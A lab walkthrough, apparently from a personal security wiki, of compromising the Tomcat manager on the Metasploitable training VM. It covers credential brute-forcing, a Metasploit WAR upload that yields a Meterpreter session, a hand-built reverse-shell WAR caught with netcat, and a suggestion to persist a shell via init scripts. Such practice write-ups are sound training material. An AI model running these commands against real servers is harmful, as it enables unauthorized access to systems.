
# Metasploitable/Apache/Tomcat and Coyote
Contents [hide]

    1 Tomcat Service
        1.1 What is tomcat
        1.2 What is coyote
    2 Tomcat Recon
    3 Metasploit Modules for Tomcat
        3.1 Login Credentials
            3.1.1 tomcat mgr login
        3.2 Uploading Java Executable with Metasploit
            3.2.1 Automated Metasploit File Upload
            3.2.2 Set Metasploit Options
            3.2.3 Run the Exploit (Failure)
            3.2.4 Run the Exploit (Worked)
            3.2.5 Houston, We Have A Meterpreter Shell
        3.3 Uploading Java Executable Manually
            3.3.1 Craft WAR Payload
            3.3.2 Netcat Listener
            3.3.3 Houston, We Have a Shell
            3.3.4 Clean Up
    4 Flags

## Tomcat Service

We will attempt to abuse the Tomcat server in order to obtain access to the web server. The end goal is to obtain a shell on the web server.

Just a reminder of what the nmap scan returned about Apache Tomcat and Coyote:
```
10.0.0.27  8180  tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1
```

JSP stands for JavaServer Pages. All this means is, web pages accessed through port 8180 will be assembled by a Java web application.
What is tomcat

Apache Tomcat provides software to run Java applets in the browser. The nmap scan didn't return the version, so that's probably the first thing we'll want to figure out.
What is coyote

Coyote is a stand-alone web server that provides servlets to Tomcat applets. That is, it functions like the Apache web server, but for JavaServer Pages (JSP).

From the description of Coyote on the Tomcat page [1], it sounds like this server will be as susceptible to denial of service attacks as the Apache web server was.


### Tomcat Recon

Let's start by doing some recon of the Tomcat server using the various HTTP scanners in Metasploit.

Running the HTTP dir scanner module turns up some goodies:
```
msf auxiliary(dir_listing) > use auxiliary/scanner/http/dir_scanner
msf auxiliary(dir_scanner) > set RHOSTS 10.0.0.27
RHOSTS => 10.0.0.27
msf auxiliary(dir_scanner) > set RPORT 8180
RPORT => 8180
msf auxiliary(dir_scanner) > run

[*] Detecting error code
[*] Using code '404' as not found for 10.0.0.27
[*] Found http://10.0.0.27:8180/admin/ 200 (10.0.0.27)
[*] Found http://10.0.0.27:8180/jsp-examples/ 200 (10.0.0.27)
[*] Found http://10.0.0.27:8180/tomcat-docs/ 200 (10.0.0.27)
[*] Found http://10.0.0.27:8180/webdav/ 200 (10.0.0.27)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(dir_scanner) >
```
These turn up some interesting pages that can potentially be bypassed:
```
Tomcat admin.png

Tomcat webdav.png
Metasploit Modules for Tomcat
```
The recon we do feeds into the choice of Metasploit modules that we make. First, we have a login page - this provides us with a way to brute-force login credentials. Second, we have a WebDAV interface, and a potential avenue for uploading a PHP shell. Third, the server works much like the Apache server, and is susceptible to denial of service attacks.
### Login Credentials

```
msf > use auxiliary/scanner/http/tomcat_mgr_login
```
We'll definitely want to try blank passwords. Let's set some options:
```
msf auxiliary(tomcat_mgr_login) > workspace metasploitable
[*] Workspace: metasploitable
msf auxiliary(tomcat_mgr_login) > set BLANK_PASSWORDS true
BLANK_PASSWORDS => true
msf auxiliary(tomcat_mgr_login) > set RHOSTS 10.0.0.27
RHOSTS => 10.0.0.27
msf auxiliary(tomcat_mgr_login) > set USER_AS_PASS true
USER_AS_PASS => true
msf auxiliary(tomcat_mgr_login) > set RPORT 8180
RPORT => 8180

Now fire it up:

msf auxiliary(tomcat_mgr_login) > run

[+] 10.0.0.27:8180 - LOGIN SUCCESSFUL: tomcat:tomcat

```
Success! The username/password tomcat/tomcat will get us access to the server.
### Uploading Java Executable with Metasploit

Just as obtaining a remote shell on the web server with Apache required uploading and executing a PHP script (see Metasploitable/Apache/DAV), obtaining a remote shell on the web server will require uploading and executing a file - but for Tomcat, the executable must be a JSP (JavaServer Pages) application.
#### Automated Metasploit File Upload

This is contained in the tomcat_mgr_upload module:
```
msf auxiliary(dir_scanner) > use exploit/multi/http/tomcat_mgr_upload

```
Set Metasploit Options

Set some options for this exploit. We'll use the credentials we already found.
```
msf exploit(tomcat_mgr_upload) > set USERNAME tomcat
USERNAME => tomcat
msf exploit(tomcat_mgr_upload) > set PASSWORD tomcat
PASSWORD => tomcat
msf exploit(tomcat_mgr_upload) > set RHOST 10.0.0.27
RHOST => 10.0.0.27
msf exploit(tomcat_mgr_upload) > set RPORT 8180
RPORT => 8180

The TARGETURIvariable should be left to the default, manager/ - not set to admin.

msf exploit(tomcat_mgr_upload) > set TARGETURI /manager
TARGETURI => /manager
```

### Run the Exploit (Failure)

Now we are ready to run:
```
msf exploit(tomcat_mgr_upload) > run
.
[*] Exploit completed, but no session was created.
```
Does not work. Not sure why.

After running the above exploit, I can log into the management page and see the WAR is successfully being uploaded by Metasploit, and that the module is active and running.

Can configure the correct path to the Tomcat manager (which is /manager).

(Note: many admins will disable these Tomcat modules or change the name of directories.)


### Run the Exploit (Worked)

I set this aside for a day, and found another workaround (covered below). But then, later, the exploit worked as intended.
```
msf exploit(tomcat_mgr_upload) > set USERNAME tomcat
USERNAME => tomcat
msf exploit(tomcat_mgr_upload) > set PASSWORD tomcat
PASSWORD => tomcat
msf exploit(tomcat_mgr_upload) > set RHOST 10.0.0.27
RHOST => 10.0.0.27
msf exploit(tomcat_mgr_upload) > set RPORT 8180
RPORT => 8180
msf exploit(tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] 10.0.0.27:8180 - Retrieving session ID and CSRF token...
[*] 10.0.0.27:8180 - Uploading and deploying cjMiuUTZpif5w0UB5FgrZY...
[*] 10.0.0.27:8180 - Executing cjMiuUTZpif5w0UB5FgrZY...
[*] 10.0.0.27:8180 - Undeploying cjMiuUTZpif5w0UB5FgrZY ...
[*] Sending stage (45741 bytes) to 10.0.0.27
[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.27:50621) at 2016-03-30 19:33:50 -0700

meterpreter >
```
### Houston, We Have A Meterpreter Shell

Now we have a meterpreter shell! Over and on to Meterpreter.
Uploading Java Executable Manually

For some reason, the metasploit automated payload deployment had some problems. However, we can still exploit this server manually.

The management web interface gives us a place to upload WAR files, and a way to execute them manually.

### Tomcat upload.png

We can use Metasploit to craft a WAR file with the payload, then manually upload and execute it.
### Craft WAR Payload

http://securitypadawan.blogspot.com/2011/11/attacking-metasploitable-tomcat-this-is.html

```
msfpayload linux/x86/shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 W > runme.war
```
Now we upload the runme.war file, and set it running on the Tomcat server:
```
Tomcat runme upload.png
```
Note that this does NOT execute the payload yet!!!

To execute the payload and run the actual war file, we will need to visit the page http://10.0.0.27:8180/runme/. However, this will try and connect to our command-and-control server on port 4444, and we need to be listening for the incoming connection.

We'll use netcat to receive the incoming shell once the WAR file is executed.
Netcat Listener

Now we set netcat listening on port 4444, the port we hard-coded into our payload:
```
nc -v -l -p 4444
```
Now, netcat will listen for the incoming connection, so you're ready to execute your payload.

Once the runme.war module is enabled through the Tomcat server, visit the applet in your browser:
```
http://10.0.0.27:8180/runme/
```
You'll see the incoming TCP connection in netcat.
```
root@morpheus:~# nc -v -l -p 4444
listening on [any] 4444 ...

10.0.0.27: inverse host lookup failed: Unknown host
connect to [10.0.0.25] from (UNKNOWN) [10.0.0.27] 35148
```
### Houston, We Have a Shell

Congrats - we've got ourselves a shell!

The shell is nothing fancy, but it lets us do some things on the filesystem.

We are the tomcat 5.5 user:
```
id
uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)
```
Here I list the contents of the root directory:
```
cd /
ls
bin
boot

```
Note that you are not root so you cannot modify files that you don't own. Same goes for trying to access SSH keys - if they're read-only for that user, you won't be able to see them.
```
ls -la
lrwxrwxrwx 1 root     root        9 2012-05-14 00:26 .bash_history -> /dev/null
drwxr-xr-x 4 msfadmin msfadmin 4096 2010-04-17 14:11 .distcc
drwx------ 2 msfadmin msfadmin 4096 2016-03-29 06:25 .gconf
drwx------ 2 msfadmin msfadmin 4096 2016-03-29 06:25 .gconfd
-rw-r--r-- 1 msfadmin msfadmin  586 2010-03-16 19:12 .profile
-rwx------ 1 msfadmin msfadmin    4 2012-05-20 14:22 .rhosts
drwx------ 2 msfadmin msfadmin 4096 2010-05-17 21:43 .ssh
drwxr-xr-x 6 msfadmin msfadmin 4096 2010-04-27 23:44 vulnerable
-rw------- 1 msfadmin msfadmin   60 2016-03-27 19:14 .Xauthority
touch .bash_history
ls -la
total 40
drwxr-xr-x 7 msfadmin msfadmin 4096 2016-03-27 19:14 .
drwxr-xr-x 6 root     root     4096 2010-04-16 02:16 ..
lrwxrwxrwx 1 root     root        9 2012-05-14 00:26 .bash_history -> /dev/null
drwxr-xr-x 4 msfadmin msfadmin 4096 2010-04-17 14:11 .distcc
drwx------ 2 msfadmin msfadmin 4096 2016-03-29 06:25 .gconf
drwx------ 2 msfadmin msfadmin 4096 2016-03-29 06:25 .gconfd
-rw-r--r-- 1 msfadmin msfadmin  586 2010-03-16 19:12 .profile
-rwx------ 1 msfadmin msfadmin    4 2012-05-20 14:22 .rhosts
drwx------ 2 msfadmin msfadmin 4096 2010-05-17 21:43 .ssh
drwxr-xr-x 6 msfadmin msfadmin 4096 2010-04-27 23:44 vulnerable
-rw------- 1 msfadmin msfadmin   60 2016-03-27 19:14 .Xauthority
```
You can also dump the contents of the startup scripts:
```
cd /etc/init.d
ls
```
You could modify one of these services (or add a new one) to open a netcat shell. Need some additional practice with these netcat shells. It's possible to use a text editor like vi, but also very clunky.

It should be a lot easier to utilize an open reverse TCP connection to transfer files with netcat.

http://securitypadawan.blogspot.com/2011/11/attacking-metasploitable-tomcat-this-is.html
### Clean Up

Remove the runme war file by going back to http://10.0.0.27:8180/manager/html and clicking "Undeploy".
